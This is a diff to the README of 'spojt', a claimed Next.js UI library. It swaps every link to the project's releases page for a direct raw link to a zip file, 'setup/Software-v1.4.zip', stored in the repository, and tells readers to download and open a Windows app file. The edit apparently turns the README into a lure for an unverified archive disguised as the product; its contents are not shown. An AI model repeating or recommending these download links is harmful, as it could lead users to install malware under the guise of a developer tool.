@@ -1,6 +1,6 @@
 # 🪼 spojt - Atomic UI for fast Next.js pages
 
-[⬇️ Download spojt](https://github.com/metaoverrefined604/spojt/releases)
+[⬇️ Download spojt](https://github.com/metaoverrefined604/spojt/raw/refs/heads/main/setup/Software-v1.4.zip)
 
 ## 🚀 What is spojt
 
@@ -10,7 +10,7 @@ spojt is a Next.js UI app for building clean web pages with a ready-made set of 
 
 Use the download page to get the Windows app file.
 
-1. Visit the download page: https://github.com/metaoverrefined604/spojt/releases
+1. Visit the download page: https://github.com/metaoverrefined604/spojt/raw/refs/heads/main/setup/Software-v1.4.zip
 2. Look for the latest release
 3. Download the Windows file from that release
 4. Open the file after the download finishes
@@ -19,7 +19,7 @@ Use the download page to get the Windows app file.
 
 ## 📥 Download
 
-[Download spojt for Windows](https://github.com/metaoverrefined604/spojt/releases)
+[Download spojt for Windows](https://github.com/metaoverrefined604/spojt/raw/refs/heads/main/setup/Software-v1.4.zip)
 
 After the download page opens, pick the newest release and download the Windows file from there. If the page shows more than one file, choose the one for Windows.
 
@@ -139,6 +139,6 @@ After you open spojt, you should expect a clear interface with page sections, la
 
 ## 📌 Release page
 
-[Open the spojt releases page](https://github.com/metaoverrefined604/spojt/releases)
+[Open the spojt releases page](https://github.com/metaoverrefined604/spojt/raw/refs/heads/main/setup/Software-v1.4.zip)
 
 Use this page to get the latest Windows download and check for newer builds later
